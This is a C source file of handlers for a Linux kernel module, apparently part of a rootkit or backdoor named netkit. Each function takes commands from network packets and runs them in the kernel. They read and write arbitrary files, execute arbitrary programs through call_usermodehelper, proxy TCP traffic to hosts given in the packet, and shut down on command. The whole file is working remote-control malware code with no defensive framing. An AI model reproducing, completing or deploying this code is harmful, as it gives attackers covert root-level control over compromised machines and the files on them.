#include <linux/types.h>
#include <linux/module.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/syscalls.h>

#include "handlers.h"

#include "../packet/packet.h"
#include "../../sys/mem.h"
#include "../../sys/socket.h"
#include "../../sys/file.h"
#include "../../netkit.h"
#include "../../sys/kernel.h"

int cmd_handle_file_read(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{
    return file_read(packet->content, res_buf, res_buflen);
}

int cmd_handle_file_write(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{
    size_t file_pathlen;
    struct file *file;
    int retv;

    file_pathlen = strlen(packet->content);
    file = filp_open(packet->content, O_WRONLY | O_CREAT, 0);
    if (IS_ERR(file))
    {
        pr_err("[!] failed to open file\n");
        return PTR_ERR(file);
    }

    pr_err("[*] writing size: %lu\n", packet->content_len - file_pathlen - 3);
    retv = kernel_write(file, packet->content + file_pathlen + 1, packet->content_len - file_pathlen - 3, 0);
    filp_close(file, NULL);
    if (retv < 0)
    {
        pr_err("[!] failed to write to file\n");
        return retv;
    }
    
    return 0;
}

int cmd_handle_file_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{
    char* envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    char* argv[] = {NULL, NULL};

    // quick 'n dirty way to circumvent const
    u8* content_mod = kzmalloc(packet->content_len, GFP_KERNEL);
    memcpy(content_mod, packet->content, packet->content_len);

    argv[0] = content_mod;

    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

int cmd_handle_proxy(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{
    static struct socket *sock;
    struct sockaddr_in *addr;
    int retv = 0;

    if (packet->content_len < 6)
        return -EMSGSIZE;

    retv = socket_create(*(__be32*)packet->content, *(unsigned short*)(packet->content+4), &sock, &addr);
    if (retv < 0)
        return retv;
    
    retv = socket_connect(sock, addr);
    if (retv < 0)
        goto LAB_OUT;
    
    retv = socket_write(sock, packet->content+6, packet->content_len-6);
    if (retv < 0)
        goto LAB_OUT;

    retv = socket_read(sock, res_buf, res_buflen);

LAB_OUT:
    sock_release(sock);
    kzfree(addr, sizeof(*addr));
    
    return retv;
}

int cmd_handle_exit(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{

    return -1;
}